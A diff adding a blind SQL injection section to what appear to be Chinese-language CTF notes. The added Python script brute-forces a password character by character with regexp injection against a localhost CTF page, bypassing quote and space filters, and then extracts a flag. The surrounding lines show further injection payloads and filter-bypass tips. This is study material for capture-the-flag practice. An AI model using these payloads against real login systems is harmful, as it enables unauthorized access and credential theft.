@@ -85,6 +85,26 @@ select user from users where user='\' and pwd='||1;'
 等价于：
 select user from users where user='xxxxxxxxxxx'||1#
 ```
+盲注
+```
+import string
+import requests
+import re
+char_set = '0123456789abcdefghijklmnopqrstuvwxyz_'
+pw = ''
+while 1:
+    for ch in char_set:
+        url = 'http://localhost/CTF/?user=\\&pwd=||pwd/**/regexp/**/"^%s";%%00'
+        r = requests.get(url=url%(pw+ch))
+        if 'Welcome Admin' in r.text:
+            pw += ch
+            print(pw)
+            break
+    if ch == '_': break
+r = requests.get('http://localhost/CTF/?user=&pwd=%s' % pw)
+print(re.findall('HRCTF{\S{1,50}}',r.text)[0])
+```
+
 ^
 ## **or 被过滤导致orderby、information_schema都不能用**
 用其他逻辑运算符and ， && ， &， |  ,1^1^
